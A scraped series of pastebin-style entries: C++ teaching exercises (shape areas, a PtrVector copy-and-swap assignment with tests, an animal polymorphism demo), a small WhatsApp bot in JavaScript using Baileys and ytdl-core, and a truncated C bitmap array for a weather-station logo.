        // –í—ã–ø–æ–ª–Ω—è–µ–º —Å–∞–º–æ–ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏–µ
        octopus = octopus;

        // –ü–æ—Å–ª–µ —Å–∞–º–æ–ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ—Å—å–º–∏–Ω–æ–≥–∞ –Ω–µ –¥–æ–ª–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å—Å—è
        assert(octopus.GetTentacleCount() == static_cast<int>(tentacles.size()));
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            auto& tentacle_with_link = tentacles.at(i);
            assert(&octopus.GetTentacle(i) == tentacle_with_link.first);
            assert(octopus.GetTentacle(i).GetLinkedTentacle() == tentacle_with_link.second);
        }
    }
}"
TAGUsYxK,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:13:41 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if (s != NULL){
        cout << ""We will compute the area"" << endl;
        cout << ""The area is "" << s->getArea() << endl;
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}"
USjQdsad,–°–ü–†–ò–ù–¢ ‚Ññ 7 | –ú–æ–¥–µ–ª—å –ø–∞–º—è—Ç–∏ –≤ C++ | –£—Ä–æ–∫ 10: –ü—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤ 1/2,chevengur,C++,Tuesday 23rd of April 2024 11:07:32 AM CDT,"#include <algorithm>
#include <cassert>
#include <stdexcept>
#include <vector>
#include <iostream>

using namespace std;

// –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç—É –∑–∞–≥–æ—Ç–æ–≤–∫—É PtrVector –∏–ª–∏ –∑–∞–º–µ–Ω–∏—Ç–µ –µ—ë –Ω–∞ —Å–≤–æ—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // –°–æ–∑–¥–∞—ë—Ç –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ –∫–æ–ø–∏–∏ –æ–±—ä–µ–∫—Ç–æ–≤ –∏–∑ other
    PtrVector(const PtrVector& other) {
        // –†–µ–∑–µ—Ä–≤–∏—Ä—É–µ–º –º–µ—Å—Ç–æ –≤ vector-–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω—É–∂–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        // –ë–ª–∞–≥–æ–¥–∞—Ä—è —ç—Ç–æ–º—É –ø—Ä–∏ push_back –Ω–µ –±—É–¥–µ—Ç –≤—ã–±—Ä–∞—Å—ã–≤–∞—Ç—å—Å—è –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // –ö–æ–ø–∏—Ä—É–µ–º –æ–±—ä–µ–∫—Ç, –µ—Å–ª–∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –Ω–µ–≥–æ –Ω–µ–Ω—É–ª–µ–≤–æ–π
                auto p_copy = p ? new T(*p) : nullptr;  // new –º–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ

                // –ù–µ –≤—ã–±—Ä–æ—Å–∏—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —Ç. –∫. –≤ vector –ø–∞–º—è—Ç—å —É–∂–µ –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∞
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // —É–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –≤ –≤–µ–∫—Ç–æ—Ä–µ –∏ –ø–µ—Ä–µ–≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –ø–æ–π–º–∞–Ω–Ω–æ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
            DeleteItems();
            throw;
        }
    }

    // –î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä —É–¥–∞–ª—è–µ—Ç –æ–±—ä–µ–∫—Ç—ã –≤ –∫—É—á–µ, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ —Å—Å—ã–ª–∞—é—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–∏,
    // –≤ –≤–µ–∫—Ç–æ—Ä–µ items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);
                        
        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }

  
    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

//#include ""octopus.h""


using namespace std;

// –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è main —Ç–µ—Å—Ç–∏—Ä—É–µ—Ç —à–∞–±–ª–æ–Ω –∫–ª–∞—Å—Å–∞ PtrVector
int main() {
    struct CopyingSpy {
        CopyingSpy(int& copy_count, int& deletion_count)
            : copy_count_(copy_count)
            , deletion_count_(deletion_count) {
        }
        CopyingSpy(const CopyingSpy& rhs)
            : copy_count_(rhs.copy_count_)          // —Å—á—ë—Ç—á–∏–∫ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–π
            , deletion_count_(rhs.deletion_count_)  // —Å—á—ë—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–∏–π
        {
            if (rhs.throw_on_copy_) {
                throw runtime_error(""copy construction failed""s);
            }
            ++copy_count_;
        }
        ~CopyingSpy() {
            ++deletion_count_;
        }
        void ThrowOnCopy() {
            throw_on_copy_ = true;
        }

    private:
        int& copy_count_;
        int& deletion_count_;
        bool throw_on_copy_ = false;
    };

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;
        {
            PtrVector<CopyingSpy> v;

            v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
            v.GetItems().push_back(nullptr);
            {
                PtrVector<CopyingSpy> v_copy;
                v_copy = v;
                assert(v_copy.GetItems().size() == v.GetItems().size());
                assert(v_copy.GetItems().at(0) != v.GetItems().at(0));
                assert(v_copy.GetItems().at(1) == nullptr);
                assert(item0_copy_count == 1);
                assert(item0_deletion_count == 0);
            }
            assert(item0_deletion_count == 1);
        }
        assert(item0_deletion_count == 2);
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç–∏ —Å–∞–º–æ–ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏—è
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        CopyingSpy* first_item = v.GetItems().front();

        v = v;
        assert(v.GetItems().size() == 1);
        // –ü—Ä–∏ —Å–∞–º–æ–ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏–∏ –æ–±—ä–µ–∫—Ç—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω—ã –ø–æ —Ç–µ–º –∂–µ –∞–¥—Ä–µ—Å–∞–º
        assert(v.GetItems().front() == first_item);
        assert(item0_copy_count == 0);
        assert(item0_deletion_count == 0);
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è —Å—Ç—Ä–æ–≥–æ–π –≥–∞—Ä–∞–Ω—Ç–∏–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–π –ø—Ä–∏ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–Ω–∏–∏
    {
        int item0_copy_count = 0;
        int item0_deletion_count = 0;

        int item1_copy_count = 0;
        int item1_deletion_count = 0;

        // v —Ö—Ä–∞–Ω–∏—Ç 2 —ç–ª–µ–º–µ–Ω—Ç–∞
        PtrVector<CopyingSpy> v;
        v.GetItems().push_back(new CopyingSpy(item0_copy_count, item0_deletion_count));
        v.GetItems().push_back(new CopyingSpy(item1_copy_count, item1_deletion_count));

        int other_item0_copy_count = 0;
        int other_item0_deletion_count = 0;
        // other_vector —Ö—Ä–∞–Ω–∏—Ç 1 —ç–ª–µ–º–µ–Ω—Ç, –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥–µ—Ç –≤—ã–±—Ä–æ—à–µ–Ω–æ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
        PtrVector<CopyingSpy> other_vector;
        other_vector.GetItems().push_back(new CopyingSpy(other_item0_copy_count, other_item0_deletion_count));
        other_vector.GetItems().front()->ThrowOnCopy();

        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–∞—Å—Å–∏–≤ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
        auto v_items(v.GetItems());

        try {
            v = other_vector;
            // –û–ø–µ—Ä–∞—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
            assert(false);
        }
        catch (const runtime_error&) {
        }

        // –≠–ª–µ–º–µ–Ω—Ç—ã –º–∞—Å—Å–∏–≤–∞ –¥–æ–ª–∂–Ω—ã –æ—Å—Ç–∞—Ç—å—Å—è –ø—Ä–µ–∂–Ω–∏–º–∏
        assert(v.GetItems() == v_items);
        assert(item0_copy_count == 0);
        assert(item1_copy_count == 0);
        assert(other_item0_copy_count == 0);
    }
}

"
uB7y57Y2,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:59:07 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;


class Animal {
    public:
        virtual void makeSound() = 0;
};
class Dog : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Woof!"" << endl;
        }
};
class Cat : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Meaaaaw!"" << endl;
        }
};
class Parrot : public Animal {
    public:
        virtual void makeSound(){
            cout << ""Hello, I'm a parrot!"" << endl;
        }
};

int main(){

    vector<Animal *> zoo;

    srand(time(NULL));
    for(int i = 0; i < 10; i++){
        /*
        Animal *a;
        switch(rand()%3){
            case 0:
                a = new Dog();
                break;
            case 1:
                a = new Cat();
                break;
            case 2:
                a = new Parrot();
                break;
        }
        zoo.push_back(a);
        */
        zoo.push_back(new Parrot());

    }

    for(int i = 0; i < 10; i++){
        zoo[i]->makeSound();
    }

    for(int i = 0; i < 10; i++){
        delete zoo[i];
    }


    return 0;
}
"
sj7DPDte,package.json,agunq,JSON,Tuesday 23rd of April 2024 10:55:05 AM CDT,"{
  ""dependencies"": {
    ""@whiskeysockets/baileys"": ""^6.6.0"",
    ""qrcode-terminal"": ""^0.12.0"",
    ""ytdl-core"": ""^4.11.5""
  }
}
"
4ZwxuAaV,index.js,agunq,JavaScript,Tuesday 23rd of April 2024 10:53:41 AM CDT,"const {
  default: Baileys,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason
} = require('@whiskeysockets/baileys');

const { Boom } = require(""@hapi/boom"");

const ytdl = require('ytdl-core');

const prefix = ""!"";

async function start() {
  try {
    // Fetch the latest Baileys version and use multi-file auth state
    let { version } = await fetchLatestBaileysVersion();
    let { state, saveCreds } = await useMultiFileAuthState('./session');

    // Create a Baileys connection with specified configurations
    const conn = Baileys({
      auth: state,
      printQRInTerminal: true
      
    });



    // Listen for 'creds.update' event and save credentials
    conn.ev.on(""creds.update"", saveCreds);

    // Listen for 'connection.update' event and handle connection updates
    conn.ev.on(""connection.update"", async (update) => {
      const { lastDisconnect, connection } = update;
    
      // Log connection status
      if (connection) {
        console.log(connection === ""connecting"" ? ""Connecting to the WhatsApp bot..."" : `Connection: ${connection}`);
      }
    
      // Handle different connection states
      switch (connection) {
        case ""open"":
          console.log(""Successfully connected to WhatsApp"");
          break;
        case ""close"":
          handleDisconnect(lastDisconnect.error);
          break;
      }
    });
    
    // Function to handle disconnect reasons
    function handleDisconnect(error) {
      const reason = new Boom(error).output.statusCode;
    
      // Handle specific disconnect reasons
      switch (reason) {
        case DisconnectReason.badSession:
          console.log(""Bad Session File, Please Delete session and Scan Again"");
          conn.logout();
          break;
        case DisconnectReason.connectionClosed:
          console.log(""Connection closed, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionLost:
          console.log(""Connection Lost from Server, reconnecting..."");
          start();
          break;
        case DisconnectReason.connectionReplaced:
          console.log(""Connection Replaced, Another New Session Opened, Please Close Current Session First"");
          conn.logout();
          break;
        case DisconnectReason.loggedOut:
          console.log(""Device Logged Out, Please Delete session and Scan Again."");
          conn.logout();
          break;
        case DisconnectReason.restartRequired:
          console.log(""Restart Required, Restarting..."");
          start();
          break;
        case DisconnectReason.timedOut:
          console.log(""Connection TimedOut, Reconnecting..."");
          start();
          break;
        default:
          conn.end(`Unknown DisconnectReason: ${reason}|${error}`);
      }
    }

    conn.ev.on(""group-participants.update"", async (msg) => {
      console.log(msg)
    });
    
    // Listen for 'messages.upsert' event and call the handler function

	
    conn.ev.on(""messages.upsert"", async ({messages, type}) => {
      	//console.log(messages[0])
		const noWa = messages[0].key.remoteJid;
		const { text } = messages[0].message.extendedTextMessage;
		console.log(noWa, text);
		if (!messages[0].key.fromMe && text[0] === prefix){

        		let  [cmd, ...args] = text.slice(1).split("" "");
			args = args.join("" "");
			
			if (cmd == ""ping""){
				await conn.sendMessage(noWa, {text: ""Pong""},{quoted: messages[0] });
			}

			if (cmd == ""ytdl""){
				const url = await ytdl.getInfo(args)
				console.log(url.formats[url.formats.length - 1])
				let url_link = url.formats[url.formats.length - 1].url
				await conn.sendMessage(noWa, { video: { url:url_link }, mimetype: 'video/mp4' });
			}
		}

    });
  } catch (error) {
    console.error(error);
  }
}

// Start the application by calling the 'start' function
start();
"
atEAen8x,Simbolini Stazione Meteo,overvolt,C,Tuesday 23rd of April 2024 10:46:44 AM CDT,"
const unsigned char logo[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,
0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X00,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X00,0X03,0XFF,0XF0,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X3F,0XFF,
0XFF,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0XFF,0XE1,0XFF,0XC0,0X00,0X07,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,
0XFF,0XE1,0XFF,0XF8,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X1F,0XFF,0XE1,0XFF,0XFE,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X3F,0XFF,0XF3,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1C,0XFF,0XFF,
0XFF,0XFF,0XFF,0XCE,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,
0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,
0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X7F,0XFF,0XFF,0XFF,0XF1,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XF0,0X7F,0XFF,
0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XF7,0X1F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XE7,
0X8F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X63,0XFF,0XFF,0XFF,0XE7,0XE3,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,0XFF,0XFF,
0XFF,0XEF,0XF1,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X41,0XFF,0XFF,0XFF,0XCF,0XFC,0XFF,0XFF,0XFF,0X80,
0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,
0XFF,0XFF,0XFF,0XCF,0XF9,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X77,0XFF,0XFF,0XFF,0XDF,0XF3,0XFF,0XFF,
0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XE7,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XCF,
0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XBF,0X9F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,
